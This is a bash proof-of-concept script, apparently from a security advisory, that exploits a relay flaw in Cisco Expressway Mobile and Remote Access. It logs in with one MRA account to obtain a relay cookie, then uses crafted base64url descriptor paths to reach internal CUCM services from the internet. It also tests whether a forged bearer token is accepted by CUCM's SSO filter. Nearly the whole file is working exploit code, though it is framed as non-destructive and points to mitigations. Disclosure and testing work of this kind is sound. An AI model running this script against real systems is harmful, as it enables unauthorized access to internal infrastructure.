#!/bin/bash
# False;Relay — Cisco Expressway MRA corridor PoC (credential tier, non-destructive)
# SKYLINE-2026-004 chain · components 005 (Blankhack) + corridor relay + 004 (Badgehack) differential
# 0xReadingSteiner — 2026-09-27
#
# Demonstrates, with ONE legitimate MRA account and GET requests only:
#   [1] small-lane login        -> real X-Auth relay cookie (8h)
#   [2] descriptor-route probe  -> internal CUCM UDS data answered to an internet-origin request
#   [3] S1 control (no bearer)  -> CUCM's own 401 realm signature = relay reached the internal webapp
#   [4] S2 differential         -> with a forged Bearer (see ADVISORY §4.7; forging NOT included here):
#                                  404 + Set-Cookie: JSESSIONIDSSO = CUCM SSO filter ACCEPTED the token
#
# Secrets discipline: cookie/token values are NEVER printed or stored — sha256 8-hex prefixes only.
# Pacing: >=3s between requests (edge fail2ban hygiene). No state is modified anywhere.
#
# Usage:
#   ./poc.sh --edge edge.example.com:8443 --domain example.com \
#            --target cucm01.internal.example.com --port 8443 --user MRAUSER \
#            [--webport 443] [--bearer forged_token_file]
#   Password is prompted via stdin (never argv). --bearer is optional; without it steps 3-4
#   run the S1 control only.

set -u
EDGE="" DOMAIN="" TARGET="" PORT=8443 WEBPORT=443 USER="" BEARER_FILE=""
while [ $# -gt 0 ]; do
  case "$1" in
    --edge)    EDGE="$2"; shift 2;;
    --domain)  DOMAIN="$2"; shift 2;;
    --target)  TARGET="$2"; shift 2;;
    --port)    PORT="$2"; shift 2;;
    --webport) WEBPORT="$2"; shift 2;;
    --user)    USER="$2"; shift 2;;
    --bearer)  BEARER_FILE="$2"; shift 2;;
    *) echo "unknown arg: $1"; exit 2;;
  esac
done
[ -n "$EDGE" ] && [ -n "$DOMAIN" ] && [ -n "$TARGET" ] && [ -n "$USER" ] || {
  echo "usage: $0 --edge HOST:8443 --domain DOMAIN --target INTERNAL_HOST --port 8443 --user MRAUSER [--webport 443] [--bearer TOKEN_FILE]"; exit 2; }

b64url() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '=\n'; }
sha8()   { printf '%s' "$1" | sha256sum | cut -c1-8; }
pace()   { sleep 3; }

SMALL="$(b64url "$DOMAIN")"
DESC_UDS="$(b64url "$DOMAIN/https/$TARGET/$PORT")"
DESC_WEB="$(b64url "$DOMAIN/https/$TARGET/$WEBPORT")"
BASE="https://$EDGE"
TMPH="$(mktemp)"; trap 'rm -f "$TMPH"' EXIT

echo "[*] False;Relay PoC — target edge: $EDGE"
echo "[*] small lane : /$SMALL/get_edge_config"
echo "[*] uds lane   : /$DESC_UDS/..."
echo "[*] web lane   : /$DESC_WEB/..."
echo

read -r -s -p "[?] MRA password for $USER (input hidden): " PASS; echo

# --- [1] small-lane login ---------------------------------------------------
echo "[1] small-lane login ..."
CODE=$(curl -sk -o /dev/null -D "$TMPH" -w '%{http_code}' -u "$USER:$PASS" \
  "$BASE/$SMALL/get_edge_config")
COOKIE=$(grep -i '^set-cookie:' "$TMPH" | grep -o 'X-Auth=[A-Za-z0-9_-]*' | head -1 | cut -d= -f2)
CLEN=${#COOKIE}
if [ "$CODE" = "200" ] && [ "$CLEN" -ge 32 ]; then
  echo "    HTTP $CODE — X-Auth issued: len=$CLEN sha8=$(sha8 "$COOKIE")  [value never displayed]"
else
  echo "    HTTP $CODE — no relay cookie issued (len=$CLEN). Login failed or lane restricted. Aborting."
  exit 1
fi
rm -f "$TMPH"; pace

# --- [2] descriptor-route probe: internal UDS data --------------------------
echo "[2] corridor probe: GET /$DESC_UDS/cucm-uds/version (cookie only, no bearer) ..."
BODY=$(curl -sk -w '\n%{http_code}' -H "Cookie: X-Auth=$COOKIE" \
  "$BASE/$DESC_UDS/cucm-uds/version")
CODE=$(printf '%s' "$BODY" | tail -1)
XML=$(printf '%s' "$BODY" | head -n -1)
XLEN=$(printf '%s' "$XML" | wc -c)
VER=$(printf '%s' "$XML" | grep -o 'version="[0-9.]*"' | head -1)
echo "    HTTP $CODE — ${XLEN}B; $VER"
if [ "$CODE" = "200" ]; then
  echo "    [!] RELAY CONFIRMED — internal CUCM answered an internet-origin request with live data."
else
  echo "    [-] relay did not deliver 200 (deployment may restrict descriptor lanes). Continuing to differential."
fi
rm -f "$TMPH"; pace

# --- [3] S1 control: reachability of the internal webapp, no bearer ---------
echo "[3] S1 control: GET /$DESC_WEB/headset/?x=1 (cookie, NO bearer) ..."
CODE=$(curl -sk -o /dev/null -D "$TMPH" -w '%{http_code}' -H "Cookie: X-Auth=$COOKIE" \
  "$BASE/$DESC_WEB/headset/?x=1")
REALM=$(grep -io 'www-authenticate:.*realm="[^"]*"' "$TMPH" | head -1)
echo "    HTTP $CODE — $REALM"
if [ "$CODE" = "401" ] && printf '%s' "$REALM" | grep -qi 'web services'; then
  echo "    [!] S1 EXACT — the request reached CUCM itself through the corridor."
fi
rm -f "$TMPH"; pace

# --- [4] S2 differential: forged-bearer acceptance (only with --bearer) -----
if [ -n "$BEARER_FILE" ] && [ -f "$BEARER_FILE" ]; then
  TOKEN=$(tr -d '\n\r' < "$BEARER_FILE")
  echo "[4] S2 differential: same request + Authorization: Bearer (sha8=$(sha8 "$TOKEN")) ..."
  CODE=$(curl -sk -o /dev/null -D "$TMPH" -w '%{http_code}' \
    -H "Cookie: X-Auth=$COOKIE" -H "Authorization: Bearer $TOKEN" \
    "$BASE/$DESC_WEB/headset/?x=1")
  SSO=$(grep -io 'set-cookie: *JSESSIONIDSSO=[A-F0-9]*' "$TMPH" | head -1 | cut -d= -f2)
  echo "    HTTP $CODE — JSESSIONIDSSO=${SSO:+issued (len=${#SSO})}${SSO:-none}"
  if [ -n "$SSO" ]; then
    echo
    echo "[!] VULNERABLE — False;Relay corridor live end-to-end:"
    echo "[!]   internet-origin request -> edge presence-gate -> relay -> CUCM"
    echo "[!]   SSO filter ACCEPTED the supplied bearer token (session issued)."
  else
    echo "    [-] S2 not observed (token invalid/expired, or path constraint differs)."
  fi
  rm -f "$TMPH"
else
  echo "[4] skipped — no --bearer token file supplied (S1 control above is the non-forge verdict)."
fi

echo
echo "[*] Done. GET-only, nothing modified; cookie/token values never left this process."
echo "[*] Interpretation + full chain evidence: ADVISORY.md §5. Detection: mitigations.md."
